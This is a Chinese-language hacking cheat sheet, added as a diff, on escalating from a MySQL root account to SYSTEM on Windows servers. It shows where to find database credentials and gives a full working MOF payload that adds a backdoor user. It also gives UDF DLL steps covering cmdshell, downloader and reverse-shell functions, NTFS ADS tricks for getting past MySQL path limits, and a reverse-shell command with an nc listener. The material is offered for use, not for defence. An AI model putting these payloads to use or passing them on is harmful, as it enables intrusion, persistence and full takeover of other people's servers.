@@ -1,0 +1,155 @@
+[获取root密码]
+=============================================
+
+php配置文件
+
+config.php
+config.inc.php
+conn.php
+
+=============================================
+
+asp配置文件
+
+conn.asp
+
+=============================================
+
+user.MYD 一般在数据库目录下的/mysql下
+下载后用winhex打开 mysql root密码 40位hash
+
+=============================================
+
+
+[提权]
+=============================================
+
+mof提权
+
+在c:/windows/system32/wbem/mof/目录下的nullevt.mof每分钟都会有一个特定的时间去执行一次
+(由"And TargetInstance.Second = 5";控制，这里输入5就是每分钟的第五秒执行。)，
+那么把cmd命令添加到nullevt.mof中，cmd命令就会自动执行了。
+前提:有mysql的root密码。
+
+找一个可写目录上传mof文件]
+
++++++++++++++++++++++++++++++++++++++++++++++
+	#pragma namespace("\\\\.\\root\\subscription")
+
+	instance of __EventFilter as $EventFilter
+	{
+		EventNamespace = "Root\\Cimv2";
+		Name  = "filtP2";
+		Query = "Select * From __InstanceModificationEvent "
+			"Where TargetInstance Isa \"Win32_LocalTime\" "
+			"And TargetInstance.Second = 5";
+		QueryLanguage = "WQL";
+	};
+
+	instance of ActiveScriptEventConsumer as $Consumer
+	{
+		Name = "consPCSV2";
+		ScriptingEngine = "JScript";
+		ScriptText =
+			"var WSH = new ActiveXObject(\"WScript.Shell\")\nWSH.run(\"net.exe user waitalone waitalone.cn /add\")";
+	};
+
+	instance of __FilterToConsumerBinding
+	{
+		Consumer   = $Consumer;
+		Filter = $EventFilter;
+	};
++++++++++++++++++++++++++++++++++++++++++++++
+
+执行load_file及into dumpfile把文件导出到正确的位置即可
+
++++++++++++++++++++++++++++++++++++++++++++++
+	select load_file('C:/wmpub/nullevt.mof') into dumpfile 'c:/windows/system32/wbem/mof/nullevt.mof'
++++++++++++++++++++++++++++++++++++++++++++++
+
+=============================================
+
+udf提权
+
+以下是对langouster_udf.dll详解介绍。
+一、功能：利用MYSQL的Create Function语句，将MYSQL账号转化为系统system权限。
+
+
+二、适用场合：1.目标系统是Windows(Win2000,XP,Win2003)；2.你已经拥有MYSQL的某个用户账号，
+此账号必须有对mysql的insert和delete权限以创建和抛弃函数(MYSQL文档原语)。
+
+
+三、使用帮助：
+
+第一步：将本文件上传到目标机上，填入你的MYSQL账号经行连接。
+
+第二步：连接成功后，导出DLL文件，导出时请勿必注意导出路径（一般情况下对任何目录可写，无需考虑权限问题），
+对于MYSQL5.0以上版本，你必须将DLL导出到目标机器的系统目录(win 或 system32)，
+否则在下一步操作中你会看到”No paths allowed for shared library”错误。
+
+第三步：使用SQL语句创建功能函数。
+语法：Create Function 函数名（函数名只能为下面列表中的其中之一） returns string soname ‘导出的DLL路径’；
+对于MYSQL5.0以上版本，语句中的DLL不允许带全路径，如果你在第二步中已将DLL导出到系统目录，
+那么你就可以省略路径而使命令正常执行，否则你将会看到”Can’t open shared library”错误，这时你必须将DLL重新导出到系统目录。
+
+第四步：正确创建功能函数后，你就可以用SQL语句来使用这些功能了。
+语法：select 创建的函数名(‘参数列表’)； 每个函数有不同的参数，你可以使用select 创建的函数名(‘help’)；
+来获得指定函数的参数列表信息。
+
+第五步：使用完成后你可能需要删除在第二步中导出的DLL，但在删除DLL前请先删除你在第三步中创建的函数，
+否则删除操作将失败，删除第三步中创建的函数的SQL语句为：drop function 创建的函数名；
+
+
+四、功能函数说明：
+cmdshell 执行cmd;
+downloader 下载者,到网上下载指定文件并保存到指定目录;
+open3389 通用开3389终端服务,可指定端口(不改端口无需重启);
+backshell 反弹Shell;
+ProcessView 枚举系统进程;
+KillProcess 终止指定进程;
+regread 读注册表;
+regwrite 写注册表;
+shut 关机,注销,重启;
+about 说明与帮助函数;l
+
+如今普遍mysql版本都>=5.0
+1124 - No paths allowed for shared library
+因为在mysql5之后不能用绝对路径
+5.0及以后的版本，要上传到系统目录或PATH这个环境变量所表示的任何一个目录
+5.1及以后的版本，要上传到mysql安装目录下的lib/pulgin目录
+MYSQL5以后，对注册的DLL的位置有了限制，创建函数的时候，所对应的DLL不能包含/或者\，简单的理解就是不能是绝对路径。
+所以我们将DLL释放到system32目录，来跳过这个限制。。或者放到盘符的根目录下通过c:udf.dll这种形式的写法来跳过限制。
+只要把dll放到PATH这个环境变量所表示的任何一个目录下面，效果跟放到system32目录下面一样
+
+1126 - Can't open shared library 'udf.dll'
+这是因为MYSQL 5.1及以后的版本中，又多了一个限制。创建函数时所用的DLL只能放在mysql的plugin目录里面，
+而且这个plugin目录默认是不存在的，那么自己在mysql安装目录下建lib/plugin 文件夹，把udf.dll导到这里就行
+这里又有个技巧，显示mysql的安装路径  SHOW VARIABLES LIKE '%plugin%';
+
+某些情况下，我们会遇到Can't open shared library的情况，这时就需要我们把udf.dll导出到lib\plugin目录下才可以，
+但是默认情况下plugin不存在，怎么办？ 还好有大牛研究出了利用NTFS ADS流来创建文件夹的方法
+
+++++++++++++++++++++++++++++++++++++++++
+	select @@basedir;   
+	//查找到mysql的目录
+	select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib::$INDEX_ALLOCATION';   
+	//利用NTFS ADS创建lib目录
+	select 'It is dll' into dumpfile 'C:\\Program Files\\MySQL\\MySQL Server 5.1\\lib\\plugin::$INDEX_ALLOCATION';
+	//利用NTFS ADS创建plugin目录
+++++++++++++++++++++++++++++++++++++++++
+
+=============================================
+反弹端口连接提权
+
+假如我们扫到了一个mysql的root弱密码，并且可以外连，但是服务器上面的网站又无法Getshell，这时我们怎么办呢？
+1、利用mysql客户端工具连接mysql服务器，然后执行下面的操作。
+
++++++++++++++++++++++++++++++++++++++++++++++
+	mysql.exe -h 172.16.10.11 -uroot -p
+	Enter password:
+	mysql> \. c:\mysql.txt
+	mysql>select backshell("YourIP",2010);
+++++++++++++++++++++++++++++++++++++++++
+2、本地监听你反弹的端口
+nc.exe -vv -l -p 2010
+成功后，你将获得一个system权限的cmdshell，其实这个也是利用的UDF提权。
